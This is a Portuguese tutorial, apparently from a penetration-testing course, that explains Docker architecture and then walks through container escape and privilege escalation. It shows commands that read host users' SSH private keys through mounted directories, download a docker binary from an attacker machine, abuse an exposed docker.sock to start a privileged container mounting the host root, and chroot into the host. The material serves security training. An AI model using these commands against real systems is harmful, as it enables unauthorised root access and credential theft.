Docker é uma ferramenta de código aberto que oferece um ambiente de tempo de execução portátil e consistente para aplicativos, utilizando contêineres isolados que compartilham recursos do sistema.

Uma de suas principais vantagens é o consumo significativamente menor de recursos em comparação com servidores tradicionais ou máquinas virtuais. Os contêineres Docker encapsulam aplicativos e podem ser executados em qualquer sistema operacional, funcionando como pacotes autônomos que contêm tudo o necessário para rodar um aplicativo.

## Arquitetura Docker

No centro da arquitetura do Docker está um modelo ``cliente-servidor``, onde temos dois componentes principais:

- O daemon do Docker
- O cliente Docker

O cliente Docker atua na emissão de comandos e na interação do ecossistema Docker, enquanto o daemon Docker é responsável por executar esses comandos e gerenciar contêineres.

### Daemon do Docker
O `Docker Daemon`, também conhecido como servidor Docker, é uma parte crítica da plataforma Docker que desempenha um papel fundamental no gerenciamento e orquestração de contêineres. Pense no Docker Daemon como a potência por trás do Docker. Ele tem várias responsabilidades essenciais, como:

- executando contêineres Docker
- interagindo com contêineres Docker
- gerenciando contêineres Docker no sistema host.

### Gerenciando contêineres Docker
A funcionalidade principal do Docker envolve a coordenação da criação, execução e monitoramento de contêineres, garantindo seu isolamento do host e de outros contêineres, permitindo que operem de forma independente.

Além disso, o Docker gerencia imagens, extraindo-as de registros como Docker Hub ou repositórios privados e armazenando-as localmente. Essas imagens são usadas como base para criar contêineres.

Além disso, o Docker Daemon oferece recursos de monitoramento e registro, por exemplo:

- Captura logs de contêiner
- Fornece insights sobre atividades de contêiner, erros e informações de depuração.

O Daemon também monitora a utilização de recursos, como CPU, memória e uso de rede, permitindo-nos otimizar o desempenho do contêiner e solucionar problemas.

### Rede e Armazenamento
O Docker facilita a rede de contêineres criando e gerenciando redes virtuais, permitindo a comunicação entre contêineres e com o mundo externo por meio de portas de rede, endereços IP e DNS.

O Docker Daemon também gerencia o armazenamento, manipulando volumes do Docker para persistir dados além da vida útil dos contêineres. Ele cuida da criação, anexação e limpeza de volumes, permitindo que os contêineres compartilhem ou armazenem dados de forma independente.

### Clientes Docker
Interagimos com o Docker através do ``Docker Client``, que se comunica com o Docker Daemon por meio de uma ``API RESTful`` ou um ``Unix socket``. Isso nos permite criar, iniciar, parar, gerenciar e remover contêineres, além de pesquisar e baixar imagens do Docker.

Podemos usar imagens existentes como base para nossos contêineres ou construir imagens personalizadas com Dockerfiles. Também temos a flexibilidade de enviar essas imagens para repositórios remotos, facilitando a colaboração e o compartilhamento com equipes e a comunidade.

Em comparação, o Daemon, por outro lado, executa as ações solicitadas, garantindo que os contêineres sejam criados, iniciados, interrompidos e removidos conforme necessário.

Outro cliente para o Docker é o `Docker Compose`. É uma ferramenta que simplifica a orquestração de vários contêineres do Docker como um único aplicativo. Ele nos permite definir a arquitetura multicontêiner do nosso aplicativo usando um arquivo declarativo `YAML`( `.yaml`/ `.yml`).

Com ele, podemos especificar os serviços que compõem nosso aplicativo, suas dependências e suas configurações. Definimos imagens de contêiner, variáveis ​​de ambiente, rede, vinculações de volume e outras configurações.

O Docker Compose então garante que todos os contêineres definidos sejam iniciados e interconectados, criando uma pilha de aplicativos coesa e escalável.

### Área de trabalho do Docker
Docker Desktop está disponível para MacOS, Windows e Linux, oferecendo uma interface gráfica amigável que simplifica o gerenciamento de contêineres e seus componentes.

Ele permite monitorar o status dos contêineres, inspecionar logs e gerenciar recursos alocados ao Docker, proporcionando uma maneira intuitiva e visual de interagir com o ecossistema Docker. Além disso, Docker Desktop oferece suporte ao Kubernetes, tornando-o acessível a desenvolvedores de todos os níveis de especialização.

### Imagens e contêineres do Docker
Uma imagem Docker é como um blueprint que encapsula tudo necessário para executar um aplicativo, incluindo código, dependências e configurações, garantindo consistência e reprodutibilidade em diferentes ambientes. As imagens são criadas usando um Dockerfile, que define as etapas para construir a imagem.

Um contêiner Docker é uma instância de uma imagem, funcionando como um ambiente isolado e executável que herda as propriedades e configurações da imagem. Cada contêiner opera independentemente, com seu próprio sistema de arquivos, processos e interfaces de rede, garantindo que os aplicativos dentro dos contêineres permaneçam separados do sistema host e de outros contêineres.

Enquanto as imagens são imutáveis e somente leitura, os contêineres são mutáveis e podem ser modificados durante a execução. As alterações feitas em um contêiner não são persistidas, a menos que sejam salvas como uma nova imagem ou armazenadas em um volume persistente.

## Escalonamento de privilégios do Docker
O que pode acontecer é que temos acesso a um ambiente onde encontraremos usuários que podem gerenciar contêineres docker.

Com isso, poderíamos procurar maneiras de usar esses contêineres docker para obter privilégios mais altos no sistema de destino. Podemos usar várias maneiras e técnicas para escalar nossos privilégios ou escapar do contêiner docker.

### Diretórios compartilhados do Docker

No Docker, diretórios compartilhados (montagens de volume) permitem que diretórios ou arquivos específicos do sistema host sejam disponibilizados dentro do contêiner. Isso é útil para persistir dados, compartilhar código e facilitar a colaboração entre ambientes de desenvolvimento e contêineres Docker.

Para criar um diretório compartilhado, especifica-se um caminho no sistema host e um caminho correspondente dentro do contêiner, criando um link direto entre os dois.

Os diretórios compartilhados oferecem vantagens como persistência de dados além do tempo de vida do contêiner, simplificação do compartilhamento de código e colaboração em equipe.

Eles podem ser montados como somente leitura ou leitura-gravação, dependendo dos requisitos do administrador. Quando montados como somente leitura, as modificações no contêiner não afetam o sistema host, evitando alterações acidentais. Além disso, ao acessar e enumerar o contêiner, pode-se encontrar diretórios adicionais no sistema de arquivos do Docker.

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir daqui, poderíamos copiar o conteúdo da chave SSH privada para um arquivo `cry0l1t3.priv`  e usá-lo para efetuar login como usuário `cry0l1t3` no sistema host.

```shell-session
NycolasES6@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### Soquetes Docker
O Docker socket é um arquivo especial que permite a comunicação entre o Docker client e o Docker daemon, usando Unix sockets ou network sockets, dependendo da configuração. Ele facilita a interação entre o cliente e o daemon Docker, enviando comandos e processando ações solicitadas.

O acesso ao socket Docker é restrito a usuários ou grupos específicos para garantir segurança e prevenir acesso não autorizado. Quando exposto em uma interface de rede, o socket permite gerenciar remotamente hosts Docker, emitir comandos e controlar recursos, o que é útil para configurações distribuídas e gerenciamento remoto.

No entanto, é importante notar que arquivos e tarefas automatizados armazenados podem conter informações valiosas que podem ser usadas para escapar do contêiner Docker.

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Daqui em diante, podemos usar o `docker` para interagir com o socket e enumerar quais contêineres docker já estão em execução. Se não estiver instalado, podemos baixá-lo [aqui](https://master.dockerproject.org/linux/x86_64/docker) e carregá-lo para o contêiner Docker.

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos criar nosso próprio contêiner Docker que mapeia o diretório raiz do host ( `/`) para o diretório `/hostsystem` no contêiner. Com isso, teremos acesso total ao sistema host. Portanto, devemos mapear esses diretórios adequadamente e usar a `main_app` imagem Docker.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Agora, podemos efetuar login no novo contêiner privilegiado do Docker com o ID `7ae3bcc818af`e navegar até o `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir daí, podemos tentar novamente obter a chave SSH privada e efetuar login como root ou como qualquer outro usuário no sistema com uma chave SSH privada em sua pasta.

### Grupo Docker
Para obter privilégios de root por meio do Docker, o usuário com o qual estamos logados deve estar no grupo `docker`. Isso permite que ele use e controle o daemon do Docker.

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, o Docker pode ter o SUID definido, ou estamos no arquivo Sudoers, o que nos permite executar `docker`como root. Todas as três opções nos permitem trabalhar com o Docker para escalar nossos privilégios.

A maioria dos hosts tem uma conexão direta com a internet porque as imagens base e os contêineres devem ser baixados. No entanto, muitos hosts podem ser desconectados da internet à noite e fora do horário de trabalho por motivos de segurança. No entanto, se esses hosts estiverem localizados em uma rede onde, por exemplo, um servidor web tem que passar, ele ainda pode ser alcançado.

Para ver quais imagens existem e quais podemos acessar, podemos usar o seguinte comando:

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

### Soquete Docker
Um caso que também pode ocorrer é quando o socket Docker é gravável. Normalmente, esse socket está localizado em `/var/run/docker.sock`.

No entanto, o local pode ser compreensivelmente diferente. Porque basicamente, isso só pode ser escrito pelo grupo root ou docker. Se agirmos como um usuário, não em um desses dois grupos, e o socket Docker ainda tiver os privilégios para ser gravável, então ainda podemos usar esse caso para escalar nossos privilégios.

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

```shell-session
root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
<SNIP>
```






















































































































